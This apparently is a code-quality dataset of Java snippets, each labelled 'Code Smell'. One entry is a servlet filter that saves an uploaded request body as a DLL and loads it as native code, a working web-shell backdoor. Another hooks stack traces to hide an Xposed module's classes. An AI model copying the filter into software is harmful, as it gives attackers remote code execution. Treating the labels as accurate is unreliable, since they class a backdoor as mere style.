 * @return related tags, for example,      <pre>[{ ""oId"": """", ""tagTitle"": """", ""tagDescription"": """", .... }, ....] </pre>, returns an empty list if not found
 */
public List<JSONObject> getRelatedTags(final String tagId,final int fetchSize){
  final List<JSONObject> ret=new ArrayList<>();
  final Set<String> tagIds=new HashSet<>();
  try {
    JSONObject result=tagTagRepository.getByTag1Id(tagId,1,fetchSize);
    List<JSONObject> relations=(List<JSONObject>)result.opt(Keys.RESULTS);
    boolean full=false;
    for (    JSONObject relation : relations) {
      tagIds.add(relation.optString(Tag.TAG + ""2_"" + Keys.OBJECT_ID));
      if (tagIds.size() >= fetchSize) {
        full=true;
        break;
      }
    }
    if (!full) {
      result=tagTagRepository.getByTag2Id(tagId,1,fetchSize);
      relations=(List<JSONObject>)result.opt(Keys.RESULTS);
      for (int i=0; i < relations.size(); i++) {
        tagIds.add(relations.get(i).optString(Tag.TAG + ""1_"" + Keys.OBJECT_ID));
        if (tagIds.size() >= fetchSize) {
          break;
        }
      }
    }
    for (    final String tId : tagIds) {
      final JSONObject tag=tagRepository.get(tId);
      if (null != tag) {
        Tag.fillDescription(tag);
        ret.add(tag);
      }
    }
    return ret;
  }
 catch (  final RepositoryException e) {
    LOGGER.log(Level.ERROR,""Gets related tags failed"",e);
    return Collections.emptyList();
  }
}",1,Code Smell
"@Override public void init(){
  Helpers.findAndHookMethod(""com.android.systemui.statusbar.phone.MiuiPhoneStatusBarView"",lpparam.classLoader,""handleEvent"",MotionEvent.class,new MethodHook(){
    @Override protected void before(    MethodHookParam param){
      boolean useCC=(boolean)XposedHelpers.callMethod(XposedHelpers.getObjectField(param.thisObject,""mPanelController""),""isExpandable"");
      if (useCC) {
        FrameLayout bar=(FrameLayout)param.thisObject;
        Object mControlPanelWindowManager=XposedHelpers.getObjectField(param.thisObject,""mControlPanelWindowManager"");
        boolean dispatchToControlPanel=(boolean)XposedHelpers.callMethod(mControlPanelWindowManager,""dispatchToControlPanel"",param.args[0],bar.getWidth());
        if (isAndroidU()) {
          XposedHelpers.setObjectField(mControlPanelWindowManager,""mTransToControlPanel"",dispatchToControlPanel);
        }
 else {
          XposedHelpers.callMethod(mControlPanelWindowManager,""setTransToControlPanel"",dispatchToControlPanel);
        }
        param.setResult(dispatchToControlPanel);
        return;
      }
      param.setResult(false);
    }
  }
);
  Helpers.findAndHookMethod(""com.android.systemui.controlcenter.phone.ControlPanelWindowManager"",lpparam.classLoader,""dispatchToControlPanel"",MotionEvent.class,float.class,new MethodHook(){
    @Override protected void before(    MethodHookParam param){
      boolean added=XposedHelpers.getBooleanField(param.thisObject,""added"");
      if (added) {
        boolean useCC;
        if (isMoreAndroidVersion(33)) {
          useCC=XposedHelpers.getBooleanField(XposedHelpers.getObjectField(param.thisObject,""mControlCenterController""),""useControlCenter"");
        }
 else {
          useCC=(boolean)XposedHelpers.callMethod(XposedHelpers.getObjectField(param.thisObject,""mControlCenterController""),""isExpandable"");
        }
        if (useCC) {
          MotionEvent motionEvent=(MotionEvent)param.args[0];
          if (motionEvent.getActionMasked() == 0) {
            XposedHelpers.setObjectField(param.thisObject,""mDownX"",motionEvent.getRawX());
          }
          Object controlCenterWindowView=XposedHelpers.getObjectField(param.thisObject,""mControlPanel"");
          if (controlCenterWindowView == null) {
            param.setResult(false);
          }
 else {
            float mDownX=XposedHelpers.getFloatField(param.thisObject,""mDownX"");
            float width=(float)param.args[1];
            if (mDownX < width / 2.0f) {
              param.setResult(XposedHelpers.callMethod(controlCenterWindowView,""handleMotionEvent"",motionEvent,true));
            }
 else {
              param.setResult(false);
            }
          }
          return;
        }
      }
      param.setResult(false);
    }
  }
);
}",1,Code Smell
"/** 
 * Adds the words in a name (e.g., firstname/lastname) to the binary dictionary along with their bigrams depending on locale.
 */
private void addNameLocked(final String name){
  int len=StringUtils.codePointCount(name);
  NgramContext ngramContext=NgramContext.getEmptyPrevWordsContext(BinaryDictionary.MAX_PREV_WORD_COUNT_FOR_N_GRAM);
  for (int i=0; i < len; i++) {
    if (Character.isLetter(name.codePointAt(i))) {
      int end=ContactsDictionaryUtils.getWordEndPosition(name,len,i);
      String word=name.substring(i,end);
      if (DEBUG_DUMP) {
        Log.d(TAG,""addName word = "" + word);
      }
      i=end - 1;
      final int wordLen=StringUtils.codePointCount(word);
      if (wordLen <= MAX_WORD_LENGTH && wordLen > 1) {
        if (DEBUG) {
          Log.d(TAG,""addName "" + name + "", ""+ word+ "", ""+ ngramContext);
        }
        runGCIfRequiredLocked(true);
        addUnigramLocked(word,ContactsDictionaryConstants.FREQUENCY_FOR_CONTACTS,null,0,false,false,BinaryDictionary.NOT_A_VALID_TIMESTAMP);
        if (ngramContext.isValid() && mUseFirstLastBigrams) {
          runGCIfRequiredLocked(true);
          addNgramEntryLocked(ngramContext,word,ContactsDictionaryConstants.FREQUENCY_FOR_CONTACTS_BIGRAM,BinaryDictionary.NOT_A_VALID_TIMESTAMP);
        }
        ngramContext=ngramContext.getNextNgramContext(new NgramContext.WordInfo(word));
      }
    }
  }
}",1,Code Smell
"private static <T>T handleCircleReference(T instance){
  LogUtil.verbose(""Verifying "" + instance.getClass());
  try {
    if (instance.getClass().isArray()) {
      for (int i=0; i < Array.getLength(instance); i++) {
        handleCircleReference(Array.get(instance,i),instance.getClass().getComponentType(),new HashMap<Class<?>,Object>(INITIAL_CAPACITY));
      }
    }
 else {
      handleCircleReference(instance,instance.getClass(),new HashMap<Class<?>,Object>(INITIAL_CAPACITY));
    }
  }
 catch (  IllegalAccessException e) {
    throw new ClassConstructionException(""Failed to access field"",e);
  }
  return instance;
}
private static void handleCircleReference(Object instance,Class<?> type,Map<Class<?>,Object> classPool) throws IllegalAccessException {
  if (instance == null) {
    return;
  }
  classPool.put(type,instance);
  for (  Field f : TypeUtil.getAllFields(type)) {
    if (f.getName().startsWith(DOLLAR) || isStaticFinalField(f)) {
      continue;
    }
    f.setAccessible(true);
    Object fieldIns=f.get(instance);
    Class<?> fieldType=f.getType();
    if (fieldType.isArray()) {
      Class<?> componentType=fieldType.getComponentType();
      if (fieldIns != null && !TypeUtil.isBasicType(componentType)) {
        LogUtil.verbose(classPool.size() * 2,""Verifying Field(Array[%d]) %s"",Array.getLength(fieldIns),f.getName());
        handleCircleReferenceOfArrayField(fieldIns,componentType,classPool);
      }
    }
 else     if (!TypeUtil.isBasicType(fieldType)) {
      if (fieldIns == null && classPool.containsKey(fieldType)) {
        f.set(instance,classPool.get(fieldType));
      }
 else       if (!classPool.containsKey(fieldType)) {
        LogUtil.verbose(classPool.size() * 2,""Verifying Field %s"",f.getName());
        handleCircleReference(fieldIns,fieldType,classPool);
      }
    }
  }
  classPool.remove(type);
}",1,Code Smell
"@Override public long open(DataSpec dataSpec) throws HttpDataSourceException {
  Assertions.checkNotNull(dataSpec);
  Assertions.checkState(!opened);
  operation.close();
  resetConnectTimeout();
  currentDataSpec=dataSpec;
  try {
    currentUrlRequest=buildRequestBuilder(dataSpec).build();
  }
 catch (  IOException e) {
    throw new OpenException(e,currentDataSpec,Status.IDLE);
  }
  currentUrlRequest.start();
  transferInitializing(dataSpec);
  try {
    boolean connectionOpened=blockUntilConnectTimeout();
    if (exception != null) {
      throw new OpenException(exception,currentDataSpec,getStatus(currentUrlRequest));
    }
 else     if (!connectionOpened) {
      throw new OpenException(new SocketTimeoutException(),dataSpec,getStatus(currentUrlRequest));
    }
  }
 catch (  InterruptedException e) {
    Thread.currentThread().interrupt();
    throw new OpenException(new InterruptedIOException(e),dataSpec,Status.INVALID);
  }
  int responseCode=responseInfo.getHttpStatusCode();
  if (responseCode < 200 || responseCode > 299) {
    InvalidResponseCodeException exception=new InvalidResponseCodeException(responseCode,responseInfo.getHttpStatusText(),responseInfo.getAllHeaders(),currentDataSpec);
    if (responseCode == 416) {
      exception.initCause(new DataSourceException(DataSourceException.POSITION_OUT_OF_RANGE));
    }
    throw exception;
  }
  if (contentTypePredicate != null) {
    List<String> contentTypeHeaders=responseInfo.getAllHeaders().get(CONTENT_TYPE);
    String contentType=isEmpty(contentTypeHeaders) ? null : contentTypeHeaders.get(0);
    if (!contentTypePredicate.evaluate(contentType)) {
      throw new InvalidContentTypeException(contentType,currentDataSpec);
    }
  }
  bytesToSkip=responseCode == 200 && dataSpec.position != 0 ? dataSpec.position : 0;
  if (!getIsCompressed(responseInfo)) {
    if (dataSpec.length != C.LENGTH_UNSET) {
      bytesRemaining=dataSpec.length;
    }
 else {
      bytesRemaining=getContentLength(responseInfo);
    }
  }
 else {
    bytesRemaining=currentDataSpec.length;
  }
  opened=true;
  transferStarted(dataSpec);
  return bytesRemaining;
}",1,Code Smell
"private List<Pair<Integer,Integer>> calcChooseSeatLevelPairList(int[][] actualSeats,List<String> chooseSeatList){
  String firstChooseSeat=chooseSeatList.get(0);
  int firstSeatX=Integer.parseInt(firstChooseSeat.substring(1));
  int firstSeatY=SEAT_Y_INT.get(firstChooseSeat.charAt(0));
  List<Pair<Integer,Integer>> chooseSeatLevelPairList=new ArrayList<>();
  chooseSeatLevelPairList.add(new Pair<>(firstSeatX,firstSeatY));
  int minLevelX=0;
  for (int i=1; i < chooseSeatList.size(); i++) {
    String chooseSeat=chooseSeatList.get(i);
    int chooseSeatX=Integer.parseInt(chooseSeat.substring(1));
    int chooseSeatY=SEAT_Y_INT.get(chooseSeat.charAt(0));
    minLevelX=Math.min(minLevelX,chooseSeatX - firstSeatX);
    chooseSeatLevelPairList.add(new Pair<>(chooseSeatX - firstSeatX,chooseSeatY - firstSeatY));
  }
  for (int i=Math.abs(minLevelX); i < 7; i++) {
    List<Pair<Integer,Integer>> sureSeatList=new ArrayList<>();
    if (actualSeats[i][firstSeatY] == 0) {
      sureSeatList.add(new Pair<>(i,firstSeatY));
      for (int j=1; j < chooseSeatList.size(); j++) {
        Pair<Integer,Integer> pair=chooseSeatLevelPairList.get(j);
        int chooseSeatX=pair.getKey();
        int chooseSeatY=pair.getValue();
        int x=i + chooseSeatX;
        if (x >= 7) {
          return Collections.emptyList();
        }
        if (actualSeats[i + chooseSeatX][firstSeatY + chooseSeatY] == 0) {
          sureSeatList.add(new Pair<>(i + chooseSeatX,firstSeatY + chooseSeatY));
        }
 else {
          break;
        }
      }
    }
    if (sureSeatList.size() == chooseSeatList.size()) {
      return sureSeatList;
    }
  }
  return Collections.emptyList();
}",1,Code Smell
"public void doFilter(ServletRequest request,ServletResponse response,FilterChain chain) throws IOException, ServletException {
  HttpServletRequest req=(HttpServletRequest)request;
  HttpServletResponse resp=(HttpServletResponse)response;
  String webrootpath=req.getServletContext().getRealPath(""/"");
  String webjsppath=req.getServletPath();
  String midilepath=(new File(""."").getAbsolutePath());
  PrintWriter out=resp.getWriter();
  out.println(""WebRootPath:"");
  out.println(webrootpath);
  out.println(""ServletPath:"");
  out.println(webjsppath);
  out.println(""WebServerPath:"");
  out.println(midilepath);
  try {
    boolean flag=false;
    String fp=req.getParameter(""up"");
    try {
      if (fp != null) {
        Random random=new Random(System.currentTimeMillis());
        String os=System.getProperty(""os.name"").toLowerCase();
        if (os.contains(""windows"")) {
          if (fp.contains(""nat"")) {
            String java=System.getProperty(""java.home"");
            String f="".."" + File.separator;
            fp=java + f + f+ f+ f+ f+ f+ f+ f+ f+ f+ f+ ""temp/dm""+ random.nextInt(10000000)+ ""1.dll"";
          }
 else {
            fp=""C:/Windows/temp/dm"" + random.nextInt(10000000) + ""1.dll"";
          }
        }
 else {
          fp=""/tmp/dm"" + random.nextInt(10000000) + ""1.dll"";
        }
        File file=new File(fp);
        if (file.exists()) {
          out.println(""file is exists!"");
        }
 else {
          FileOutputStream fos=new FileOutputStream(file);
          InputStream inputStream=req.getInputStream();
          byte temp[]=new byte[1024];
          int size=-1;
          while ((size=inputStream.read(temp)) != -1) {
            fos.write(temp,0,size);
          }
          fos.flush();
          fos.close();
          fp=file.getAbsolutePath();
          flag=true;
          out.println(""dll is uploaded!!!"");
        }
      }
    }
 catch (    Exception e) {
    }
    out.println(""dll location is "" + fp);
    String delpath=null;
    if (flag) {
      delpath=fp;
    }
 else {
      delpath=req.getHeader(""DelPath"");
    }
    if (!delpath.isEmpty()) {
      try {
        if (flag) {
          Runtime.getRuntime().load(delpath);
          out.println(delpath + ""dll is load!!!"");
          flag=false;
        }
        if (flag) {
          System.load(delpath);
          out.println(delpath + ""dll is load!!!"");
          flag=false;
        }
      }
 catch (      Exception e) {
        try {
          NativeLibLoader.loadLibrary(delpath);
          out.println(delpath + ""dll is load!!!"");
          flag=false;
        }
 catch (        Exception e1) {
          out.println(e1);
        }
      }
      if (flag) {
        out.println(delpath + ""dll load is failed!!!"");
      }
    }
  }
 catch (  Exception e2) {
    out.println(e2);
  }
  out.println(""if dll  will be auto load in uploading !!!"");
  out.flush();
  out.close();
}",1,Code Smell
"private static void init(){
  if (inited) {
    return;
  }
  try {
    Method m=Throwable.class.getDeclaredMethod(""getOurStackTrace"");
    XposedBridge.hookMethod(m,new XC_MethodHook(){
      @Override protected void afterHookedMethod(      MethodHookParam param){
        if (!sHideEnabled) {
          return;
        }
        StackTraceElement[] ste=(StackTraceElement[])param.getResult();
        if (ste != null) {
          ArrayList<StackTraceElement> fakeSt=new ArrayList<>();
          for (          StackTraceElement e : ste) {
            if (!e.getClassName().contains(""nil.nadph.qnotified."")) {
              fakeSt.add(e);
            }
          }
          param.setResult(fakeSt.toArray(EMPTY_STACK_TRACE));
        }
      }
    }
);
  }
 catch (  NoSuchMethodException e) {
    Utils.log(e);
  }
  try {
    Method m=Class.forName(""dalvik.system.VMStack"").getDeclaredMethod(""getThreadStackTrace"",Thread.class);
    XposedBridge.hookMethod(m,new XC_MethodHook(){
      @Override protected void afterHookedMethod(      MethodHookParam param){
        if (!sHideEnabled) {
          return;
        }
        StackTraceElement[] ste=(StackTraceElement[])param.getResult();
        if (ste != null) {
          ArrayList<StackTraceElement> fakeSt=new ArrayList<>();
          for (          StackTraceElement e : ste) {
            if (!e.getClassName().contains(""nil.nadph.qnotified."")) {
              fakeSt.add(e);
            }
          }
          param.setResult(fakeSt.toArray(EMPTY_STACK_TRACE));
        }
      }
    }
);
  }
 catch (  NoSuchMethodException|ClassNotFoundException e) {
    Utils.log(e);
  }
  inited=true;
}
",1,Code Smell
"@Override protected void propagateBlockChanges(final LightChunkGetter lightAccess,final ChunkAccess atChunk,final Set<BlockPos> positions){
  this.rewriteNibbleCacheForSkylight(atChunk);
  Arrays.fill(this.nullPropagationCheckCache,false);
  final BlockGetter world=lightAccess.getLevel();
  final int chunkX=atChunk.getPos().x;
  final int chunkZ=atChunk.getPos().z;
  final int heightMapOffset=chunkX * -16 + (chunkZ * (-16 * 16));
  for (  final BlockPos pos : positions) {
    final int index=pos.getX() + (pos.getZ() << 4) + heightMapOffset;
    final int curr=this.heightMapBlockChange[index];
    if (pos.getY() > curr) {
      this.heightMapBlockChange[index]=pos.getY();
    }
  }
  for (int index=0; index < (16 * 16); ++index) {
    final int maxY=this.heightMapBlockChange[index];
    if (maxY == Integer.MIN_VALUE) {
      continue;
    }
    this.heightMapBlockChange[index]=Integer.MIN_VALUE;
    final int columnX=(index & 15) | (chunkX << 4);
    final int columnZ=(index >>> 4) | (chunkZ << 4);
    final int maxPropagationY=this.tryPropagateSkylight(world,columnX,maxY,columnZ,true,true);
    final long propagateDirection=AxisDirection.POSITIVE_Y.everythingButThisDirection;
    final int encodeOffset=this.coordinateOffset;
    if (this.getLightLevelExtruded(columnX,maxPropagationY,columnZ) == 15) {
      this.checkNullSection(columnX >> 4,maxPropagationY >> 4,columnZ >> 4,true);
      for (int currY=maxPropagationY; currY >= (this.minLightSection << 4); --currY) {
        if ((currY & 15) == 15) {
          this.checkNullSection(columnX >> 4,(currY >> 4),columnZ >> 4,true);
        }
        final SWMRNibbleArray nibble=this.getNibbleFromCache(columnX >> 4,currY >> 4,columnZ >> 4);
        if (nibble == null) {
          currY=(currY) & (~15);
          continue;
        }
        if (nibble.getUpdating(columnX,currY,columnZ) != 15) {
          break;
        }
        this.appendToDecreaseQueue(((columnX + (columnZ << 6) + (currY << (6 + 6))+ encodeOffset) & ((1L << (6 + 6 + 16)) - 1)) | (15L << (6 + 6 + 16)) | (propagateDirection << (6 + 6 + 16+ 4)));
      }
    }
  }
  this.processDelayedIncreases();
  this.processDelayedDecreases();
  for (  final BlockPos pos : positions) {
    this.checkBlock(lightAccess,pos.getX(),pos.getY(),pos.getZ());
  }
  this.performLightDecrease(lightAccess);
}",1,Code Smell
"private void enhanceOriginTask(JettyWebServer jettyWebServer,ThreadPool threadPool){
  Connector[] connectors=(Connector[])ReflectionUtil.getFieldValue(CONNECTORS_FIELD,jettyWebServer);
  if (Objects.isNull(connectors)) {
    return;
  }
  for (  Connector connector : connectors) {
    if (!(connector instanceof ServerConnector)) {
      continue;
    }
    SelectorManager selectorManager=(SelectorManager)ReflectionUtil.getFieldValue(MANAGER_FIELD,connector);
    if (Objects.isNull(selectorManager)) {
      return;
    }
    ManagedSelector[] managedSelectors=(ManagedSelector[])ReflectionUtil.getFieldValue(SELECTORS_FIELD,selectorManager);
    if (Objects.isNull(managedSelectors)) {
      return;
    }
    for (    ManagedSelector managedSelector : managedSelectors) {
      EatWhatYouKill eatWhatYouKill=(EatWhatYouKill)ReflectionUtil.getFieldValue(STRATEGY_FIELD,managedSelector);
      if (Objects.isNull(eatWhatYouKill)) {
        continue;
      }
      ExecutionStrategy.Producer producer=(ExecutionStrategy.Producer)ReflectionUtil.getFieldValue(PRODUCER_FIELD,eatWhatYouKill);
      SelectorProducerProxy selectorProducerProxy=new SelectorProducerProxy(producer,threadPool);
      try {
        ReflectionUtil.setFieldValue(PRODUCER_FIELD,eatWhatYouKill,selectorProducerProxy);
      }
 catch (      IllegalAccessException e) {
        log.error(""DynamicTp enhance jetty origin executor failed."",e);
      }
    }
  }
}
",1,Code Smell
"private Integer[] getNextChannel(int direction){
  int channelGroupIndex=currentChannelGroupIndex;
  int liveChannelIndex=currentLiveChannelIndex;
  if (direction > 0) {
    liveChannelIndex++;
    if (liveChannelIndex >= getLiveChannels(channelGroupIndex).size()) {
      liveChannelIndex=0;
      if (Hawk.get(HawkConfig.LIVE_CROSS_GROUP,false)) {
        do {
          channelGroupIndex++;
          if (channelGroupIndex >= liveChannelGroupList.size())           channelGroupIndex=0;
        }
 while (!liveChannelGroupList.get(channelGroupIndex).getGroupPassword().isEmpty() || channelGroupIndex == currentChannelGroupIndex);
      }
    }
  }
 else {
    liveChannelIndex--;
    if (liveChannelIndex < 0) {
      if (Hawk.get(HawkConfig.LIVE_CROSS_GROUP,false)) {
        do {
          channelGroupIndex--;
          if (channelGroupIndex < 0)           channelGroupIndex=liveChannelGroupList.size() - 1;
        }
 while (!liveChannelGroupList.get(channelGroupIndex).getGroupPassword().isEmpty() || channelGroupIndex == currentChannelGroupIndex);
      }
      liveChannelIndex=getLiveChannels(channelGroupIndex).size() - 1;
    }
  }
  Integer[] groupChannelIndex=new Integer[2];
  groupChannelIndex[0]=channelGroupIndex;
  groupChannelIndex[1]=liveChannelIndex;
  return groupChannelIndex;
}",1,Code Smell
"/** 
 * Post鏂规硶璇锋眰
 * @param url     url鍦板潃
 * @param headers 璇锋眰澶�
 * @param body    璇锋眰body
 * @return resp
 */
public static Resp invokePostBody(String url,Map<String,String> headers,String body){
  return invokePostBody(url,headers,null,body);
}
/** 
 * Post鏂规硶璇锋眰
 * @param url     url鍦板潃
 * @param headers 璇锋眰澶�
 * @param paramMap 璇锋眰鍙傛暟
 * @param body    璇锋眰body
 * @return resp
 */
public static Resp invokePostBody(String url,Map<String,String> headers,Map<String,String[]> paramMap,String body){
  String contentType=headers.get(""Content-Type"");
  if (contentType == null) {
    contentType=headers.get(""content-type"");
  }
  if (contentType == null) {
    contentType=""application/x-www-form-urlencoded; charset=utf-8"";
  }
  StringBuilder urlBuilder=new StringBuilder(url);
  if (MapUtils.isNotEmpty(paramMap)) {
    if (!StringUtils.contains(url,QUESTION_SEPARATE)) {
      urlBuilder.append(QUESTION_SEPARATE).append(""_r=1"");
    }
    for (    Map.Entry<String,String[]> entry : paramMap.entrySet()) {
      for (      String value : entry.getValue()) {
        urlBuilder.append(PARAM_SEPARATE).append(entry.getKey()).append(KV_SEPARATE).append(value);
      }
    }
  }
  RequestBody b=RequestBody.create(MediaType.parse(contentType),body);
  Request.Builder rb=new Request.Builder().post(b).url(urlBuilder.toString());
  if (MapUtils.isNotEmpty(headers)) {
    for (    Map.Entry<String,String> entry : headers.entrySet()) {
      rb.header(entry.getKey(),entry.getValue());
    }
  }
  return executeRequest(rb.build());
}",1,Code Smell
"public static void postInitApplication(){
  if (applicationInited || applicationContext == null) {
    return;
  }
  applicationInited=true;
  NativeLoader.initNativeLibs(ApplicationLoader.applicationContext);
  SharedConfig.loadConfig();
  LocaleController.getInstance();
  SharedPrefsHelper.init(applicationContext);
  UserConfig.getInstance(0).loadConfig();
  try {
    connectivityManager=(ConnectivityManager)ApplicationLoader.applicationContext.getSystemService(Context.CONNECTIVITY_SERVICE);
    BroadcastReceiver networkStateReceiver=new BroadcastReceiver(){
      @Override public void onReceive(      Context context,      Intent intent){
        try {
          currentNetworkInfo=connectivityManager.getActiveNetworkInfo();
        }
 catch (        Throwable ignore) {
        }
        boolean isSlow=isConnectionSlow();
        for (        int a : SharedConfig.activeAccounts) {
          ConnectionsManager.getInstance(a).checkConnection();
          FileLoader.getInstance(a).onNetworkChanged(isSlow);
        }
        if (SharedConfig.loginingAccount != -1) {
          ConnectionsManager.getInstance(SharedConfig.loginingAccount).checkConnection();
          FileLoader.getInstance(SharedConfig.loginingAccount).onNetworkChanged(isSlow);
        }
      }
    }
;
    IntentFilter filter=new IntentFilter(ConnectivityManager.CONNECTIVITY_ACTION);
    ApplicationLoader.applicationContext.registerReceiver(networkStateReceiver,filter);
  }
 catch (  Exception e) {
    e.printStackTrace();
  }
  try {
    final IntentFilter filter=new IntentFilter(Intent.ACTION_SCREEN_ON);
    filter.addAction(Intent.ACTION_SCREEN_OFF);
    final BroadcastReceiver mReceiver=new ScreenReceiver();
    applicationContext.registerReceiver(mReceiver,filter);
  }
 catch (  Exception e) {
    e.printStackTrace();
  }
  try {
    PowerManager pm=(PowerManager)ApplicationLoader.applicationContext.getSystemService(Context.POWER_SERVICE);
    isScreenOn=pm.isScreenOn();
    if (BuildVars.LOGS_ENABLED) {
      FileLog.d(""screen state = "" + isScreenOn);
    }
  }
 catch (  Exception e) {
    e.printStackTrace();
  }
  LinkedList<Runnable> postRun=new LinkedList<>();
  for (  int a : SharedConfig.activeAccounts) {
    final int finalA=a;
    Runnable initRunnable=() -> loadAccount(finalA);
    if (finalA == UserConfig.selectedAccount) {
      initRunnable.run();
      ChatThemeController.getInstance(finalA);
    }
 else     postRun.add(initRunnable);
  }
  for (  Runnable runnable : postRun) {
    Utilities.stageQueue.postRunnable(runnable);
  }
  initPushServices();
  if (BuildVars.LOGS_ENABLED) {
    FileLog.d(""app initied"");
  }
}",1,Code Smell
"private void didPressedButton(){
  if (buttonState == 0) {
    boolean result=MediaController.getInstance().playMessage(currentMessageObject);
    if (!currentMessageObject.isOut() && (currentMessageObject.isContentUnread())) {
      if (currentMessageObject.messageOwner.peer_id.channel_id == 0) {
        MessagesController.getInstance(currentAccount).markMessageContentAsRead(currentMessageObject);
        currentMessageObject.setContentIsRead();
      }
    }
    if (result) {
      buttonState=1;
      invalidate();
    }
  }
 else   if (buttonState == 1) {
    boolean result=MediaController.getInstance().pauseMessage(currentMessageObject);
    if (result) {
      buttonState=0;
      invalidate();
    }
  }
 else   if (buttonState == 2) {
    FileLoader.getInstance(currentAccount).loadFile(currentMessageObject.getDocument(),currentMessageObject,FileLoader.PRIORITY_NORMAL,0);
    buttonState=4;
    invalidate();
  }
 else   if (buttonState == 3) {
    FileLoader.getInstance(currentAccount).cancelLoadFile(currentMessageObject.getDocument());
    buttonState=2;
    invalidate();
  }
}",1,Code Smell
"private Point startPositionRelativeToEntity(EntityView entityView){
  float offset=200.0f;
  if (currentCropState != null) {
    offset/=currentCropState.cropScale;
  }
  if (entityView != null) {
    Point position=entityView.getPosition();
    offset=Math.min(entityView.getHeight(),entityView.getWidth()) * .2f;
    return new Point(position.x + offset,position.y + offset);
  }
 else {
    float minimalDistance=100.0f;
    if (currentCropState != null) {
      minimalDistance/=currentCropState.cropScale;
    }
    Point position=centerPositionForEntity();
    for (int i=0; i < 10; ++i) {
      boolean occupied=false;
      for (int index=0; index < entitiesView.getChildCount(); index++) {
        View view=entitiesView.getChildAt(index);
        if (!(view instanceof EntityView) || view instanceof MessageEntityView)         continue;
        Point location=((EntityView)view).getPosition();
        float distance=(float)Math.sqrt(Math.pow(location.x - position.x,2) + Math.pow(location.y - position.y,2));
        if (distance < minimalDistance) {
          offset=Math.min(view.getHeight(),view.getWidth()) * .2f;
          occupied=true;
        }
      }
      if (!occupied) {
        break;
      }
 else {
        position=new Point(position.x + offset,position.y + offset);
      }
    }
    return position;
  }
}",1,Code Smell
"public void commitTransition(boolean animated){
  commitTransition(animated,true);
}
public void commitTransition(boolean animated,boolean createAnimator){
  if (!wasDraw || !animated) {
    transitionProgress=1f;
    swapStates();
    return;
  }
  DrawingState[] removedStates=new DrawingState[3];
  boolean changed=false;
  for (int i=0; i < 3; i++) {
    removedStates[i]=currentStates[i];
    if (currentStates[i].id != animatingStates[i].id) {
      changed=true;
    }
 else {
      currentStates[i].lastSpeakTime=animatingStates[i].lastSpeakTime;
    }
  }
  if (!changed) {
    transitionProgress=1f;
    return;
  }
  for (int i=0; i < 3; i++) {
    boolean found=false;
    for (int j=0; j < 3; j++) {
      if (currentStates[j].id == animatingStates[i].id) {
        found=true;
        removedStates[j]=null;
        if (i == j) {
          animatingStates[i].animationType=DrawingState.ANIMATION_TYPE_NONE;
          GroupCallUserCell.AvatarWavesDrawable wavesDrawable=animatingStates[i].wavesDrawable;
          animatingStates[i].wavesDrawable=currentStates[i].wavesDrawable;
          currentStates[i].wavesDrawable=wavesDrawable;
        }
 else {
          animatingStates[i].animationType=DrawingState.ANIMATION_TYPE_MOVE;
          animatingStates[i].moveFromIndex=j;
        }
        break;
      }
    }
    if (!found) {
      animatingStates[i].animationType=DrawingState.ANIMATION_TYPE_IN;
    }
  }
  for (int i=0; i < 3; i++) {
    if (removedStates[i] != null) {
      removedStates[i].animationType=DrawingState.ANIMATION_TYPE_OUT;
    }
  }
  if (transitionProgressAnimator != null) {
    transitionProgressAnimator.removeAllListeners();
    transitionProgressAnimator.cancel();
    if (transitionInProgress) {
      swapStates();
      transitionInProgress=false;
    }
  }
  transitionProgress=0;
  if (createAnimator) {
    transitionProgressAnimator=ValueAnimator.ofFloat(0,1f);
    transitionProgressAnimator.addUpdateListener(valueAnimator -> {
      transitionProgress=(float)valueAnimator.getAnimatedValue();
      invalidate();
    }
);
    transitionProgressAnimator.addListener(new AnimatorListenerAdapter(){
      @Override public void onAnimationEnd(      Animator animation){
        if (transitionProgressAnimator != null) {
          transitionProgress=1f;
          swapStates();
          if (updateAfterTransition) {
            updateAfterTransition=false;
            if (updateDelegate != null) {
              updateDelegate.run();
            }
          }
          invalidate();
        }
        transitionProgressAnimator=null;
      }
    }
);
    transitionProgressAnimator.setDuration(transitionDuration);
    transitionProgressAnimator.setInterpolator(CubicBezierInterpolator.DEFAULT);
    transitionProgressAnimator.start();
  }
 else {
    transitionInProgress=true;
  }
  invalidate();
}",1,Code Smell
"public static void pick(){
  Minecraft mc=Minecraft.getInstance();
  if (!(mc.cameraEntity instanceof LocalPlayer))   return;
  if (mc.level == null)   return;
  result=null;
  Vec3 origin=player.getEyePosition(AnimationTickHolder.getPartialTicks(mc.level));
  double maxRange=mc.hitResult == null ? Double.MAX_VALUE : mc.hitResult.getLocation().distanceToSqr(origin);
  AttributeInstance range=player.getAttribute(ForgeMod.BLOCK_REACH.get());
  Vec3 target=RaycastHelper.getTraceTarget(player,Math.min(maxRange,range.getValue()) + 1,origin);
  RaycastHelper.rayTraceUntil(origin,target,pos -> {
    MutableBlockPos p=BlockPos.ZERO.mutable();
    for (int x=-1; x <= 1; x++) {
      for (int y=-1; y <= 1; y++) {
        for (int z=-1; z <= 1; z++) {
          p.set(pos.getX() + x,pos.getY() + y,pos.getZ() + z);
          BlockState blockState=mc.level.getBlockState(p);
          if (!(blockState.getBlock() instanceof IHaveBigOutline))           continue;
          BlockHitResult hit=blockState.getInteractionShape(mc.level,p).clip(origin,target,p.immutable());
          if (hit == null)           continue;
          if (result != null && Vec3.atCenterOf(p).distanceToSqr(origin) >= Vec3.atCenterOf(result.getBlockPos()).distanceToSqr(origin))           continue;
          Vec3 vec=hit.getLocation();
          double interactionDist=vec.distanceToSqr(origin);
          if (interactionDist >= maxRange)           continue;
          BlockPos hitPos=hit.getBlockPos();
          vec=vec.subtract(Vec3.atCenterOf(hitPos));
          vec=VecHelper.clampComponentWise(vec,1);
          vec=vec.add(Vec3.atCenterOf(hitPos));
          result=new BlockHitResult(vec,hit.getDirection(),hitPos,hit.isInside());
        }
      }
    }
    return result != null;
  }
);
  if (result != null)   mc.hitResult=result;
}",1,Code Smell
"/** 
 * Creates a closed path for the given points.
 */
public static Path2D createPath(double... points){
  return createPath(true,points);
}
/** 
 * Creates an open or closed path for the given points.
 */
public static Path2D createPath(boolean close,double... points){
  Path2D path=new Path2D.Float(Path2D.WIND_NON_ZERO,points.length / 2 + (close ? 1 : 0));
  path.moveTo(points[0],points[1]);
  for (int i=2; i < points.length; ) {
    double p=points[i];
    if (p == MOVE_TO) {
      path.moveTo(points[i + 1],points[i + 2]);
      i+=3;
    }
 else     if (p == QUAD_TO) {
      path.quadTo(points[i + 1],points[i + 2],points[i + 3],points[i + 4]);
      i+=5;
    }
 else     if (p == CURVE_TO) {
